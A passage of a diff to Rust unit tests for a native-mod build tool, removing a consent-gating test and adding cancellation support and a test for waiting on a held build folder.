-                |_| false,
-                || None,
-            ));
-        }
-        denied(sync_internals(&folder));
-        let expected = require_consent().unwrap_err().to_string();
-        assert_eq!(
-            catalog(&folder, &folder.join("catalog")).unwrap_err(),
-            expected
-        );
-        let preview = root().join("installed.routes");
-        fs::create_dir_all(&preview).unwrap();
-        let marker = preview.join("permission-sentinel");
-        fs::write(&marker, b"unchanged").unwrap();
-        denied(routes(&folder, None));
-        assert_eq!(
-            fs::read(&marker).unwrap(),
-            b"unchanged",
-            "preview never stages before consent"
-        );
-        fs::remove_file(marker).unwrap();
-        assert!(
-            matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
-            "zero HTTP requests"
-        );
-        assert!(!output.exists());
-        assert_eq!(
-            fs::read(log_path()).ok(),
-            log_before,
-            "no build staging or log writes"
-        );
-        backend::Settings::load().allow_native_mods().unwrap();
-        assert!(backend::Settings::load().native_mods_allowed_at.is_some());
-        require_consent().unwrap();
-        original.save().unwrap();
-    }
-
     /// The build log ([`clear_log`], [`append_log`]): fresh for every attempt, and an early
     /// failure (before any command ran) recorded in it, in one test because they share the
     /// one log file.
     #[test]
     fn the_log_is_fresh_per_attempt_and_keeps_early_failures() {
         let _guard = scratch_state();
-        backend::Settings::load().allow_native_mods().unwrap();
         clear_log().unwrap();
         append_log("the last build's output").unwrap();
         clear_log().unwrap();
@@ -4555,7 +4637,6 @@ printf ']}}\n'
             Some(Profile::Optimized),
             false,
             |_| {},
-            |_| false,
         )
         .unwrap_err();
         let err = String::from(err);
@@ -4564,7 +4645,7 @@ printf ']}}\n'
         assert!(log.contains("is not prepared yet"), "{log}");
         assert!(!log.contains("the last build's output"), "{log}");
         // A failure after compiler output keeps those diagnostics and the final reason.
-        let failure: Result<(), String> = logged(|_| {
+        let failure: Result<(), String> = logged(&Cancellation::default(), &|| (), |_| {
             append_log("error[E0425]: cannot find value `missing` in this scope")?;
             Err("Could not export the engine".into())
         });
@@ -4576,7 +4657,7 @@ printf ']}}\n'
             "{log}"
         );
         assert!(!log.contains("Build completed."), "{log}");
-        let success: Result<(), String> = logged(|_| Ok(()));
+        let success: Result<(), String> = logged(&Cancellation::default(), &|| (), |_| Ok(()));
         success.unwrap();
         let log = fs::read_to_string(log_path()).unwrap();
         assert!(after_result(&log, "Build completed.\n"), "{log}");
@@ -4593,6 +4674,8 @@ printf ']}}\n'
         ] {
             let seen = std::cell::RefCell::new(String::new());
             let result: Result<(), String> = logged_then(
+                &Cancellation::default(),
+                &|| (),
                 |_| outcome,
                 |_cache| {
                     *seen.borrow_mut() = fs::read_to_string(log_path()).unwrap();
@@ -4612,6 +4695,35 @@ printf ']}}\n'
                 format!("{line}Freed 1 MiB of old caches\nwarning: kept\n")
             );
         }
+    }
+
+    /// A build that finds the build folder held by another build or a cleanup waits for it,
+    /// says so once, and goes on once the folder is free. A stop ends the wait.
+    #[test]
+    fn a_held_build_folder_is_waited_for() {
+        use std::sync::atomic::{AtomicUsize, Ordering::Relaxed};
+        let _guard = scratch_state();
+        let held = crate::native_cache::Cache::acquire(&backend::build_dir()).unwrap();
+        let said = AtomicUsize::new(0);
+        std::thread::scope(|scope| {
+            scope.spawn(move || {
+                std::thread::sleep(std::time::Duration::from_millis(600));
+                drop(held);
+            });
+            let lease = build_lease(&Cancellation::default(), &|| {
+                said.fetch_add(1, Relaxed);
+            });
+            assert!(lease.unwrap().is_ok());
+        });
+        assert_eq!(said.load(Relaxed), 1);
+
+        let _held = crate::native_cache::Cache::acquire(&backend::build_dir()).unwrap();
+        let stopped = Cancellation::default();
+        stopped.stop();
+        assert_eq!(
+            build_lease(&stopped, &|| ()).err().as_deref(),
+            Some(CANCELLED)
+        );
     }
 
     /// The result line is on the log, and only what the cleanup after it said (what it freed, what
